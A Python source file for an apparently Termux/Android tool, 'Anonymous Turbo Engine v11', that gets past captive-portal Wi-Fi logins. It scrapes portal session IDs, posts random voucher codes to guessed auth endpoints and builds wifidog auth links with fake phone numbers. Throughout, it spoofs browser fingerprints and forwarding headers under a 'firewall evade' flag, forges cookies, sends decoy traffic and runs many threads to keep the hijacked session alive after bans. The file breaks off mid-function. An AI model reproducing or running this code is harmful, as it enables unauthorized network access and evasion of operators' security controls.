#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ANONYMOUS TURBO ENGINE v11 ULTRA-STABLE
  - Termux  : Terminal UI (auto-detected)
  - APK/Kivy: Graphical UI
Anti-ban, auto-reconnect, session recovery, crash-proof threads.

v11 changes:
  - Centralized reconnection coordinator (no more competing monitors)
  - Cached network checks to reduce thread spawning
  - Crash-count limit on thread restarts with exponential backoff
  - Thread-safe state mutations throughout
  - Graceful shutdown with thread join
  - Removed dead code, fixed silent exception swallowing
  - Predictive reconnect and quality monitor consolidated
"""

import collections
import math
import os
import random
import re
import socket
import struct
import sys
import threading
import time
import traceback
from urllib.parse import parse_qs, urljoin, urlparse

try:
    import fcntl
except ImportError:
    fcntl = None

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    import urllib3
    urllib3.disable_warnings()
    REQUESTS_OK = True
except ImportError:
    REQUESTS_OK = False

try:
        import kivy  # noqa: F401
        KIVY_AVAILABLE = True
except ImportError:
    KIVY_AVAILABLE = False


# ── Terminal color codes ──────────────────────────────────────────────
C = {
    "G":  "\033[1;32m",
    "Y":  "\033[1;33m",
    "R":  "\033[1;31m",
    "C":  "\033[1;36m",
    "P":  "\033[1;35m",
    "W":  "\033[1;37m",
    "Gy": "\033[0;37m",
    "X":  "\033[0m",
}

# ── Kivy color palette ───────────────────────────────────────────────
K = {
    "BG":      "#0a0a1a", "BG2":    "#0e0e24",
    "CARD":    "#161638", "CARD2":  "#1c1c48",
    "DARK":    "#1a1a3a", "BORDER": "#2a2a5a",
    "GREEN":   "#00e676", "GREEN2": "#00c853",
    "YELLOW":  "#ffd740", "RED":    "#ff5252",
    "RED2":    "#d32f2f", "CYAN":   "#40c4ff",
    "CYAN2":   "#00b0ff", "PURPLE": "#bb86fc",
    "PURPLE2": "#9c64ff", "ORANGE": "#ffab40",
    "WHITE":   "#f0f0f0", "WHITE2": "#d0d0e0",
    "GRAY":    "#666688", "GRAY2":  "#444466",
}


# ── Tuning constants ─────────────────────────────────────────────────
THREAD_COUNTS        = {"N": 5,    "G": 8,    "T": 12}
BASE_DELAY           = {"N": 1.5,  "G": 0.7,  "T": 0.3}
RAMP_STEP            = 2
RAMP_PAUSE           = 1.5
EMA_ALPHA            = 0.15
MAX_SESSIONS         = 20
SESSION_TTL          = 240
HEARTBEAT_INTERVAL   = 50
WATCHDOG_INTERVAL    = 6
NET_CHECK_TIMEOUT    = 3
NET_CHECK_CACHE_TTL  = 2.0        # cache net_ok() results for 2s
MAX_CONSECUTIVE_ERRS = 8
REAUTH_COOLDOWN      = 5
RECONNECT_MAX_WAIT   = 15

PING_SPIKE_RATIO     = 3.5
PING_SPIKE_ABS       = 600
JITTER_THRESHOLD     = 150
PREDICT_INTERVAL     = 5
DECOY_INTERVAL       = 35
FIREWALL_EVADE       = True

MAX_THREAD_CRASHES   = 10         # max restarts before giving up
THREAD_CRASH_BACKOFF = 3          # initial backoff seconds

PROBE_URLS = [
    "http://connectivitycheck.gstatic.com/generate_204",
    "http://captive.apple.com/hotspot-detect.html",
    "http://clients3.google.com/generate_204",
    "http://www.msftconnecttest.com/connecttest.txt",
    "http://detectportal.firefox.com/success.txt",
]

SID_PATTERNS = [
    r'sessionId=([a-zA-Z0-9\-_]{6,})',
    r'"sessionId"\s*:\s*"([a-zA-Z0-9\-_]{6,})"',
    r'token=([a-zA-Z0-9\-_]{8,})',
    r'"token"\s*:\s*"([a-zA-Z0-9\-_]{8,})"',
    r'sid=([a-zA-Z0-9\-_]{6,})',
    r'PHPSESSID=([a-zA-Z0-9\-_]{6,})',
]

_BROWSER_PROFILES = [
    (
        "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36",
        '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
        "Android", "?1",
    ),
    (
        "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36",
        '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
        "Android", "?1",
    ),
    (
        "Mozilla/5.0 (Linux; Android 13; Redmi Note 12 Pro) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/123.0.6312.118 Mobile Safari/537.36",
        '"Chromium";v="123", "Google Chrome";v="123", "Not-A.Brand";v="99"',
        "Android", "?1",
    ),
    (
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) "
        "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
        '"Safari";v="17", "Not-A.Brand";v="8"',
        "iOS", "?1",
    ),
    (
        "Mozilla/5.0 (Linux; Android 14; OPPO Reno11 Pro) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36",
        '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
        "Android", "?1",
    ),
    (
        "Mozilla/5.0 (Linux; Android 14; vivo V30 Pro) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36",
        '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
        "Android", "?1",
    ),
    (
        "Mozilla/5.0 (Linux; Android 14; Samsung Galaxy A55) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/125.0.6422.52 Mobile Safari/537.36",
        '"Chromium";v="125", "Google Chrome";v="125", "Not-A.Brand";v="99"',
        "Android", "?1",
    ),
    (
        "Mozilla/5.0 (Linux; Android 13; Xiaomi 13T) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36",
        '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
        "Android", "?1",
    ),
]
UA_POOL = [p[0] for p in _BROWSER_PROFILES]

_DECOY_URLS = [
    "http://www.gstatic.com/generate_204",
    "http://connectivitycheck.gstatic.com/generate_204",
    "http://clients3.google.com/generate_204",
    "http://www.apple.com/library/test/success.html",
    "http://captive.apple.com/hotspot-detect.html",
    "http://www.msftconnecttest.com/connecttest.txt",
    "http://www.msftncsi.com/ncsi.txt",
    "http://detectportal.firefox.com/success.txt",
    "http://neverssl.com/",
    "http://httpbin.org/get",
]

_REFERER_CHAINS = [
    ("https://www.google.com/search?q=wifi+login", "http://{}"),
    ("https://m.facebook.com/", "http://{}"),
    ("https://www.youtube.com/", "http://{}"),
    ("https://www.google.com/", "http://{}"),
    ("https://www.tiktok.com/", "http://{}"),
    ("https://www.instagram.com/", "http://{}"),
]

_BYPASS_IPS = [
    "8.8.8.8", "1.1.1.1", "8.8.4.4", "9.9.9.9",
    "208.67.222.222", "208.67.220.220", "76.76.2.0", "94.140.14.14",
    "149.112.112.112", "185.228.168.9",
]


# ── Compiled regexes (compiled once, reused everywhere) ───────────────
_PRIVATE_NETS = [
    re.compile(r'^10\.'),
    re.compile(r'^172\.(1[6-9]|2\d|3[01])\.'),
    re.compile(r'^192\.168\.'),
    re.compile(r'^127\.'),
    re.compile(r'^169\.254\.'),
    re.compile(r'^::1$'),
    re.compile(r'^localhost$', re.IGNORECASE),
    re.compile(r'^0\.'),
]

_ALLOWED_SCHEMES = {"http", "https"}
_SID_RE = re.compile(r'^[a-zA-Z0-9\-_]{6,128}$')
_LOG_SANITIZE_RE = re.compile(r'[\r\n\x00-\x08\x0b-\x1f\x7f]')
_GATEWAY_PORT_MIN = 1
_GATEWAY_PORT_MAX = 65535
_MAX_RESPONSE_BODY = 1024 * 256  # 256 KB


# ── Thread-safe decorator with crash limit ────────────────────────────
def _safe_thread(fn):
    """Wrap a thread target so it auto-restarts on crash, up to MAX_THREAD_CRASHES."""
    def wrapper(*args, **kwargs):
        crash_count = 0
        while not Engine.stop_ev.is_set() and Engine.running:
            try:
                fn(*args, **kwargs)
                break  # clean exit
            except Exception as exc:
                crash_count += 1
                if crash_count >= MAX_THREAD_CRASHES:
                    Engine.log(f"Thread {fn.__name__} exceeded {MAX_THREAD_CRASHES} crashes, stopping")
                    break
                backoff = min(THREAD_CRASH_BACKOFF * (2 ** (crash_count - 1)), 60)
                Engine.log(
                    f"Thread {fn.__name__} crashed ({crash_count}/{MAX_THREAD_CRASHES}): "
                    f"{_sanitize_log(str(exc))}, restart in {backoff:.0f}s"
                )
                Engine.stop_ev.wait(backoff)
    wrapper.__name__ = fn.__name__
    return wrapper


# ── Cached network check ──────────────────────────────────────────────
_net_cache_lock = threading.Lock()
_net_cache_result = False
_net_cache_time = 0.0


def _net_ok_cached(timeout: int = NET_CHECK_TIMEOUT) -> bool:
    """Return cached net_ok() result if fresh, otherwise run a new check."""
    global _net_cache_result, _net_cache_time
    now = time.time()
    with _net_cache_lock:
        if now - _net_cache_time < NET_CHECK_CACHE_TTL:
            return _net_cache_result
    result = net_ok(timeout)
    with _net_cache_lock:
        _net_cache_result = result
        _net_cache_time = time.time()
    return result


# ── Reconnection coordinator ─────────────────────────────────────────
class _ReconnectCoordinator:
    """Single point of control for all reconnection activity.

    Only one reconnection attempt runs at a time.  Callers request a
    reconnection via ``request()``, which is non-blocking.  The coordinator
    thread picks up requests and executes reauth with proper cooldowns.
    """

    def __init__(self):
        self._lock = threading.Lock()
        self._requested = threading.Event()
        self._thread = None
        self._reason = ""
        self._last_reauth = 0.0

    def start(self):
        self._requested.clear()
        self._thread = threading.Thread(target=self._run, daemon=True, name="recon-coord")
        self._thread.start()

    def stop(self):
        self._requested.set()  # unblock wait
        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=5)

    def request(self, reason: str = ""):
        """Non-blocking: ask for a reconnection attempt."""
        self._reason = reason
        self._requested.set()

    @property
    def cooldown_ok(self) -> bool:
        return (time.time() - self._last_reauth) >= REAUTH_COOLDOWN

    def _run(self):
        while not Engine.stop_ev.is_set() and Engine.running:
            self._requested.wait(timeout=2)
            if Engine.stop_ev.is_set() or not Engine.running:
                break
            if not self._requested.is_set():
                continue
            self._requested.clear()

            if not self.cooldown_ok:
                continue

            reason = self._reason or "requested"
            Engine.log(f"Reconnect coordinator: {_sanitize_log(reason)}")

            with Engine.lock:
                Engine._paused = True
            try:
                self._last_reauth = time.time()
                success = reauth(max_retries=5)
                if success:
                    Engine.log("Reconnect coordinator: restored")
                else:
                    Engine.log("Reconnect coordinator: reauth failed, will retry on next request")
            except Exception as exc:
                Engine.log(f"Reconnect coordinator error: {_sanitize_log(str(exc))}")
            finally:
                with Engine.lock:
                    Engine._paused = False


_recon = _ReconnectCoordinator()


# ── Engine state ──────────────────────────────────────────────────────
class Engine:
    mode           = "N"
    running        = False
    sid            = ""
    link           = ""
    hits           = 0
    errs           = 0
    reconnects     = 0
    reauths        = 0
    ema_ping       = 0.0
    best_ping      = 9999.0
    bytes_rx       = 0
    dl_speed       = 0.0
    start_time     = 0.0
    gateway_ip     = ""
    gateway_port   = ""
    thread_count   = 0
    active_threads = 0
    auto_mode      = False
    _paused        = False
    _portal_host   = ""
    _last_reauth   = 0.0

    stop_ev      = threading.Event()
    lock         = threading.Lock()
    _start_lock  = threading.Lock()
    _reauth_lock = threading.Lock()
    log_lines    = collections.deque(maxlen=80)
    ping_hist    = collections.deque(maxlen=50)
    _sessions: list = []
    _worker_threads: list = []

    @classmethod
    def log(cls, msg: str) -> None:
        safe_msg = _sanitize_log(str(msg))
        ts   = time.strftime("%H:%M:%S")
        line = f"[{ts}] {safe_msg}"
        with cls.lock:
            cls.log_lines.append(line)
        if not KIVY_AVAILABLE:
            try:
                print(f"  {C['Gy']}{line}{C['X']}")
            except Exception:
                pass

    @classmethod
    def uptime(cls) -> str:
        if not cls.start_time:
            return "00:00:00"
        s = int(time.time() - cls.start_time)
        h, rem = divmod(s, 3600)
        m, s   = divmod(rem, 60)
        return f"{h:02d}:{m:02d}:{s:02d}"

    @classmethod
    def quality(cls):
        p = cls.ema_ping
        if p == 0 or p > 8000:
            return "---",       C["Gy"], K["GRAY"]
        if p < 80:
            return "Excellent", C["G"],  K["GREEN"]
        if p < 150:
            return "Good",      C["G"],  K["GREEN"]
        if p < 300:
            return "Fair",      C["Y"],  K["YELLOW"]
        return     "Poor",      C["R"],  K["RED"]

    @classmethod
    def inc_hits(cls, count: int = 1) -> None:
        with cls.lock:
            cls.hits += count

    @classmethod
    def inc_errs(cls, count: int = 1) -> None:
        with cls.lock:
            cls.errs += count

    @classmethod
    def inc_bytes(cls, nbytes: int) -> None:
        with cls.lock:
            cls.bytes_rx += nbytes

    @classmethod
    def update_ping(cls, ms: float) -> None:
        with cls.lock:
            cls.ema_ping = (EMA_ALPHA * ms + (1 - EMA_ALPHA) * cls.ema_ping
                            if cls.ema_ping else ms)
            if ms < cls.best_ping:
                cls.best_ping = ms
            cls.ping_hist.append(ms)

    @classmethod
    def reset(cls) -> None:
        with cls.lock:
            cls.hits = cls.errs = cls.reconnects = cls.reauths = 0
            cls.sid = ""
            cls.link = ""
            cls.ema_ping = 0.0
            cls.best_ping = 9999.0
            cls.bytes_rx = 0
            cls.dl_speed = 0.0
            cls.thread_count = cls.active_threads = 0
            cls.start_time = 0.0
            cls._portal_host = ""
            cls._last_reauth = 0.0
            cls._paused = False
            cls.gateway_ip = cls.gateway_port = ""
        cls.log_lines.clear()
        cls.ping_hist.clear()
        cls._close_sessions()
        cls._worker_threads.clear()

    @classmethod
    def _close_sessions(cls) -> None:
        with cls.lock:
            sessions, cls._sessions = cls._sessions[:], []
        for s in sessions:
            try:
                s.close()
            except Exception:
                pass


# ── Utility helpers ───────────────────────────────────────────────────
def rand_voucher() -> str:
    return str(random.randint(100000, 999999))


def rand_phone() -> str:
    return str(random.randint(9100000000, 9999999999))


def _is_safe_gateway(ip: str, port: str) -> bool:
    """Validate gateway IP and port before connecting."""
    try:
        socket.inet_aton(ip)
        pt = int(port)
        if pt < _GATEWAY_PORT_MIN or pt > _GATEWAY_PORT_MAX:
            return False
        if ip.startswith("127."):
            return False
        return True
    except (ValueError, OSError):
        return False


def _validate_sid(sid: str) -> bool:
    """Check session ID has an expected safe format."""
    return bool(_SID_RE.match(sid)) if sid else False


def _sanitize_log(msg: str) -> str:
    """Strip control characters that could cause log injection."""
    return _LOG_SANITIZE_RE.sub("?", str(msg))[:300]


def fmt_bytes(b: float) -> str:
    if b < 1024:
        return f"{b:.0f}B"
    if b < 1024 ** 2:
        return f"{b / 1024:.1f}KB"
    if b < 1024 ** 3:
        return f"{b / 1024 ** 2:.2f}MB"
    return f"{b / 1024 ** 3:.2f}GB"


def net_ok(timeout: int = NET_CHECK_TIMEOUT) -> bool:
    """Parallel DNS check - returns True if any target is reachable."""
    result = threading.Event()
    success = [False]

    def _check(host, port):
        try:
            s = socket.create_connection((host, port), timeout)
            s.close()
            success[0] = True
            result.set()
        except OSError:
            pass

    targets = [("8.8.8.8", 53), ("1.1.1.1", 53), ("208.67.222.222", 53)]
    threads = []
    for host, port in targets:
        t = threading.Thread(target=_check, args=(host, port), daemon=True)
        t.start()
        threads.append(t)

    result.wait(timeout=timeout + 1)
    return success[0]


def _stealth_headers(profile=None) -> dict:
    if profile is None:
        profile = random.choice(_BROWSER_PROFILES)
    ua, sec_ch_ua, platform, mobile = profile
    ip = random.choice(_BYPASS_IPS)

    langs = random.choice([
        "my-MM,my;q=0.9,en-US;q=0.8,en;q=0.7",
        "en-US,en;q=0.9,my;q=0.8",
        "my;q=0.9,en;q=0.8,en-GB;q=0.7",
        "en-US,en;q=0.9",
        "th-TH,th;q=0.9,en-US;q=0.8,en;q=0.7",
        "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
    ])

    base = {
        "User-Agent":                ua,
        "Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language":           langs,
        "Accept-Encoding":           "gzip, deflate",
        "Connection":                "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control":             random.choice(["max-age=0", "no-cache"]),
        "Pragma":                    "no-cache",
        "DNT":                       random.choice(["1", "0"]),
    }

    if "Chrome" in ua:
        base.update({
            "sec-ch-ua":          sec_ch_ua,
            "sec-ch-ua-mobile":   mobile,
            "sec-ch-ua-platform": f'"{platform}"',
            "Sec-Fetch-Dest":     "document",
            "Sec-Fetch-Mode":     "navigate",
            "Sec-Fetch-Site":     random.choice(["none", "cross-site", "same-origin"]),
            "Sec-Fetch-User":     "?1",
        })

    if FIREWALL_EVADE:
        via_num = random.randint(10, 99)
        base.update(random.choice([
            {"X-Forwarded-For": ip, "X-Real-IP": ip},
            {"X-Forwarded-For": f"{ip}, {random.choice(_BYPASS_IPS)}",
             "Via": f"1.1 isp-proxy-{via_num}.net (squid/4.15)"},
            {"X-Forwarded-For": ip, "X-Client-IP": ip,
             "X-Forwarded-Proto": "http"},
            {"Forwarded": f"for={ip};proto=http;by={random.choice(_BYPASS_IPS)}"},
            {"X-Forwarded-For": ip, "X-Real-IP": ip,
             "X-Originating-IP": ip},
        ]))

    return base


# ── Session management ────────────────────────────────────────────────
def _trim_sessions() -> None:
    to_close = []
    with Engine.lock:
        over = len(Engine._sessions) - MAX_SESSIONS
        if over > 0:
            to_close = Engine._sessions[:over]
            Engine._sessions = Engine._sessions[over:]
    for s in to_close:
        try:
            s.close()
        except Exception:
            pass


def new_session(mode: str = "N") -> "requests.Session":
    if not REQUESTS_OK:
        raise RuntimeError("requests/urllib3 is not installed")
    _trim_sessions()
    pool    = {"T": 15, "G": 10}.get(mode, 8)
    profile = random.choice(_BROWSER_PROFILES)

    s = requests.Session()
    retry_kwargs = {
        "total": 3,
        "backoff_factor": 0.3,
        "status_forcelist": [502, 503, 504],
        "raise_on_status": False,
    }
    try:
        retry = Retry(**retry_kwargs, allowed_methods=["GET", "POST", "HEAD"])
    except TypeError:
        retry = Retry(**retry_kwargs, method_whitelist=["GET", "POST", "HEAD"])
    adapter = HTTPAdapter(
        pool_connections=pool,
        pool_maxsize=pool,
        max_retries=retry,
    )
    s.mount("http://",  adapter)
    s.mount("https://", adapter)
    s.headers.update(_stealth_headers(profile))

    if FIREWALL_EVADE:
        cookie_name = random.choice(["_ga", "PHPSESSID", "session", "_gid", "_fbp", "NID"])
        cookie_val = (
            f"GA1.2.{random.randint(100000000, 999999999)}"
            f".{int(time.time()) - random.randint(0, 86400)}"
        )
        s.cookies.set(cookie_name, cookie_val)

    with Engine.lock:
        Engine._sessions.append(s)
    return s


def _safe_close(sess) -> None:
    """Close a session and remove it from the tracked list."""
    if not sess:
        return
    try:
        sess.close()
    except Exception:
        pass
    try:
        with Engine.lock:
            if sess in Engine._sessions:
                Engine._sessions.remove(sess)
    except Exception:
        pass


# ── Portal detection & authentication ─────────────────────────────────
def detect_portal():
    """Scan for a captive portal, extract session ID, authenticate."""
    Engine.log("Scanning captive portal...")
    sess = None
    try:
        sess = new_session()

        portal_url = None
        random.shuffle(PROBE_URLS)
        for url in PROBE_URLS:
            try:
                r = sess.get(url, allow_redirects=True, timeout=8, verify=False)
                body_text = r.content[:_MAX_RESPONSE_BODY].decode("utf-8", errors="replace")
                if r.url != url or r.status_code not in (200, 204):
                    candidate = r.url
                    p = urlparse(candidate)
                    if p.scheme in _ALLOWED_SCHEMES and p.netloc:
                        portal_url = candidate
                        break
                body_lower = body_text.lower()
                if any(kw in body_lower for kw in ("login", "portal", "auth", "captive", "redirect")):
                    portal_url = r.url
                    break
            except (requests.RequestException, OSError):
                continue

        if not portal_url:
            Engine.log("No portal redirect detected")
            _safe_close(sess)
            return None, None

        parsed = urlparse(portal_url)
        if parsed.scheme not in _ALLOWED_SCHEMES or not parsed.netloc:
            Engine.log("Unsafe portal URL scheme, skipping")
            _safe_close(sess)
            return None, None

        host = f"{parsed.scheme}://{parsed.netloc}"
        Engine.log(_sanitize_log(f"Portal: {host}"))
        Engine._portal_host = host

        try:
            r1 = sess.get(portal_url, verify=False, timeout=12, stream=True)
            raw = b""
            for chunk in r1.iter_content(chunk_size=4096):
                raw += chunk
                if len(raw) >= _MAX_RESPONSE_BODY:
                    break
            r1_text = raw.decode("utf-8", errors="replace")

            redirect = (
                re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1_text) or
                re.search(r'window\.location\s*=\s*["\']([^"\']+)["\']', r1_text) or
                re.search(r'<meta[^>]+http-equiv=["\']refresh["\'][^>]*url=([^"\'\s>]+)',
                          r1_text, re.IGNORECASE)
            )
            if redirect:
                raw_target = urljoin(portal_url, redirect.group(1))
                tp = urlparse(raw_target)
                target = raw_target if tp.scheme in _ALLOWED_SCHEMES and tp.netloc else portal_url
            else:
                target = portal_url

            time.sleep(random.uniform(0.3, 1.0))
            r2 = sess.get(target, verify=False, timeout=12, stream=True)
            raw2 = b""
            for chunk in r2.iter_content(chunk_size=4096):
                raw2 += chunk
                if len(raw2) >= _MAX_RESPONSE_BODY:
                    break
            r2_text = raw2.decode("utf-8", errors="replace")
        except (requests.RequestException, OSError, AttributeError) as exc:
            Engine.log(_sanitize_log(f"Portal fetch error: {exc}"))
            _safe_close(sess)
            return None, None

        # Extract session ID from URL, response body, or cookies
        sid = parse_qs(urlparse(r2.url).query).get("sessionId", [None])[0]
        if not sid:
            haystack = r2_text + r2.url
            for pat in SID_PATTERNS:
                m = re.search(pat, haystack)
                if m:
                    candidate_sid = m.group(1)
                    if _validate_sid(candidate_sid):
                        sid = candidate_sid
                        break
        if not sid:
            for name in ("sessionId", "session_id", "sid", "token", "PHPSESSID"):
                val = sess.cookies.get(name, "")
                if _validate_sid(val):
                    sid = val
                    break
        if not sid:
            for cookie in sess.cookies:
                if _validate_sid(cookie.value):
                    sid = cookie.value
                    break
        if not sid or not _validate_sid(sid):
            Engine.log("Session ID not found or invalid format")
            _safe_close(sess)
            return None, None

        Engine.log(f"SID: ...{sid[-8:]}")

        # Try auth endpoints
        time.sleep(random.uniform(0.2, 0.8))
        auth_endpoints = ["/api/auth/voucher/", "/api/login", "/auth", "/login",
                          "/portal/auth", "/api/v1/auth", "/connect", "/portal/login"]
        for ep in auth_endpoints:
            try:
                if not ep.startswith("/") or ".." in ep:
                    continue
                sess.post(
                    f"{host}{ep}",
                    json={"accessCode": rand_voucher(), "sessionId": sid, "apiVersion": 1},
                    timeout=6,
                    verify=False,
                )
                time.sleep(random.uniform(0.1, 0.4))
            except (requests.RequestException, OSError):
                pass

        params = parse_qs(parsed.query)
        gw = params.get("gw_address", params.get("gateway", ["192.168.60.1"]))[0]
        pt = params.get("gw_port",    params.get("port",    ["2060"]))[0]

        if not _is_safe_gateway(gw, pt):
            Engine.log(_sanitize_log(f"Gateway {gw}:{pt} failed validation, using defaults"))
            gw, pt = "192.168.60.1", "2060"

        Engine.gateway_ip, Engine.gateway_port = gw, pt
        link = f"http://{gw}:{pt}/wifidog/auth?token={sid}&phonenumber={rand_phone()}"
        Engine.log(_sanitize_log(f"Gateway: {gw}:{pt}"))

        _safe_close(sess)
        return sid, link

    except Exception as exc:
        Engine.log(_sanitize_log(f"Portal detection error: {exc}"))
        _safe_close(sess)
        return None, None


def reauth(max_retries: int = 5) -> bool:
    """Re-authenticate with the captive portal. Thread-safe via lock."""
    if not REQUESTS_OK:
        Engine.log("Re-auth unavailable: requests/urllib3 missing")
        return False
    if not Engine._reauth_lock.acquire(blocking=False):
        return False
    try:
        now = time.time()
        with Engine.lock:
            if now - Engine._last_reauth < REAUTH_COOLDOWN:
                return False
            Engine._last_reauth = now
        Engine.log("Re-authenticating...")

        for attempt in range(1, max_retries + 1):
            if Engine.stop_ev.is_set():
                return False
            try:
                if _net_ok_cached(timeout=2):
                    Engine.log("Already connected, no portal needed")
                    return True

                sid, link = detect_portal()
                if sid and link:
                    with Engine.lock:
                        Engine.sid   = sid
                        Engine.link  = link
                        Engine.reauths += 1
                    Engine.log(f"Re-auth OK: ...{sid[-8:]}")
                    return True

                if attempt < max_retries:
                    wait = min(2 * attempt, 10)
                    Engine.log(f"Re-auth attempt {attempt}/{max_retries} failed, retry in {wait}s...")
                    Engine.stop_ev.wait(wait + random.uniform(0, 1.5))
                    with Engine.lock:
                        Engine._last_reauth = time.time()
            except Exception as exc:
                Engine.log(f"Re-auth error (attempt {attempt}): {_sanitize_log(str(exc))}")
                if attempt < max_retries:
                    Engine.stop_ev.wait(min(2 * attempt, 10))

        Engine.log("Re-auth failed after all attempts")
        return False
    finally:
        Engine._reauth_lock.release()


# ── Worker threads ────────────────────────────────────────────────────
@_safe_thread
def injector(link_ref: str, mode: str) -> None:
    """Main traffic injector thread - sends keepalive requests."""
    sess             = new_session(mode)
    consecutive_errs = 0
    session_born     = time.time()

    with Engine.lock:
        Engine.active_threads += 1
    try:
        while not Engine.stop_ev.is_set() and Engine.running:
            if Engine._paused:
                Engine.stop_ev.wait(1)
                continue

            current_link = Engine.link or link_ref

            # Rotate session periodically
            if time.time() - session_born > SESSION_TTL:
                _safe_close(sess)
                sess         = new_session(mode)
                session_born = time.time()

            try:
                t0 = time.time()
                r  = sess.get(current_link, timeout=10,
                              stream=False, verify=False, allow_redirects=True)
                ms = (time.time() - t0) * 1000

                if r.status_code in (403, 429, 503):
                    Engine.log(f"Rate-limited ({r.status_code}), cooling down...")
                    Engine.inc_errs()
                    cooldown = random.uniform(8, 20) if r.status_code == 429 else random.uniform(5, 15)
                    Engine.stop_ev.wait(cooldown)
                    _safe_close(sess)
                    sess         = new_session(mode)
                    session_born = time.time()
                    continue

                if r.status_code in (301, 302, 307, 308) or (
                    r.status_code == 200
                    and r.url != current_link
                    and any(kw in r.url.lower() for kw in ("login", "auth", "portal", "captive"))
                ):
                    Engine.log("Session expired, requesting reconnect")
                    _recon.request("injector: session expired")
                    Engine.stop_ev.wait(random.uniform(2, 5))
                    continue

                Engine.inc_hits()
                Engine.inc_bytes(len(r.content))
                Engine.update_ping(ms)
                consecutive_errs = 0

            except requests.exceptions.ConnectionError:
                Engine.inc_errs()
                consecutive_errs += 1
                if consecutive_errs >= MAX_CONSECUTIVE_ERRS:
                    Engine.log("Thread: too many connection errors, requesting reconnect")
                    _recon.request("injector: consecutive connection errors")
                    consecutive_errs = 0
                backoff = min(1.5 * (1.3 ** min(consecutive_errs, 6)), 15)
                Engine.stop_ev.wait(backoff + random.uniform(0, 1.5))
                _safe_close(sess)
                sess         = new_session(mode)
                session_born = time.time()

            except requests.exceptions.Timeout:
                Engine.inc_errs()
                consecutive_errs += 1
                Engine.stop_ev.wait(random.uniform(2, 5))

            except (requests.RequestException, OSError) as exc:
                Engine.inc_errs()
                consecutive_errs += 1
                Engine.log(f"Injector request error: {_sanitize_log(str(exc))}")
                backoff = min(1.5 * (1.3 ** min(consecutive_errs, 6)), 20)
                Engine.stop_ev.wait(backoff + random.uniform(0, 1.5))
                if consecutive_errs > 4:
                    _safe_close(sess)
                    sess         = new_session(mode)
                    session_born = time.time()

            # Adaptive delay based on ping & error ratio
            d          = BASE_DELAY.get(Engine.mode, BASE_DELAY["N"])
            ping       = Engine.ema_ping
            err_ratio  = Engine.errs / max(Engine.hits + Engine.errs, 1)
            if   ping > 500:    d *= 3.0
            elif ping > 300:    d *= 2.0
            elif ping > 150:    d *= 1.5
            if   err_ratio > 0.30: d *= 2.5
            elif err_ratio > 0.15: d *= 1.5
            Engine.stop_ev.wait(d + random.uniform(d * 0.2, d * 0.8))

    finally:
        with Engine.lock:
            Engine.active_threads = max(0, Engine.active_threads - 1)
        _safe_close(sess)


def launch_threads(link: str, mode: str) -> None:
    """Ramp up injector threads gradually."""
    total    = THREAD_COUNTS.get(mode, THREAD_COUNTS["N"])
    launched = 0
    Engine.log(f"Launching {total} threads...")
    while launched < total and not Engine.stop_ev.is_set():
        for _ in range(min(RAMP_STEP, total - launched)):
            t = threading.Thread(target=injector, args=(link, mode), daemon=True)
            t.start()
            with Engine.lock:
                Engine.thread_count += 1
                Engine._worker_threads.append(t)
            launched += 1
        Engine.stop_ev.wait(RAMP_PAUSE + random.uniform(0, 0.5))
    Engine.log(f"{launched} threads active")


# ── Watchdog: monitors network and triggers reconnection ──────────────
@_safe_thread
def watchdog(link: str) -> None:
    """Periodic network check. Delegates reconnection to the coordinator."""
    fails = 0
    while not Engine.stop_ev.is_set() and Engine.running:
        Engine.stop_ev.wait(WATCHDOG_INTERVAL + random.uniform(0, 2))
        if Engine.stop_ev.is_set():
            break

        ok = _net_ok_cached(timeout=2)

        if ok:
            if fails:
                Engine.log("Network restored")
                with Engine.lock:
                    Engine.reconnects += 1
            fails = 0
            continue

        fails += 1
        with Engine.lock:
            Engine.reconnects += 1

        if fails <= 2:
            Engine.log(f"Network down (#{fails}), quick retry...")
            # Try a quick link hit first
            s = new_session()
            try:
                s.get(Engine.link or link, timeout=8, verify=False)
            except Exception:
                pass
            finally:
                _safe_close(s)

            if _net_ok_cached(timeout=2):
                Engine.log("Quick recovery successful")
                fails = 0
                continue

        # Delegate to coordinator for full reauth
        _recon.request(f"watchdog: network down ({fails} failures)")
        Engine.stop_ev.wait(min(3 * fails, RECONNECT_MAX_WAIT))


# ── Heartbeat: keeps session alive ────────────────────────────────────
@_safe_thread
def heartbeat(link: str) -> None:
    """Periodic keepalive request to prevent session timeout."""
    sess     = new_session()
    hb_count = 0
    while not Engine.stop_ev.is_set() and Engine.running:
        Engine.stop_ev.wait(HEARTBEAT_INTERVAL + random.uniform(-5, 15))
        if Engine.stop_ev.is_set():
            break
        if Engine._paused:
            continue
        try:
            r = sess.get(Engine.link or link, timeout=12, verify=False)
            hb_count += 1
            if r.status_code in (403, 429):
                Engine.log("Heartbeat rate-limited, cooling down...")
                Engine.stop_ev.wait(random.uniform(20, 45))
                _safe_close(sess)
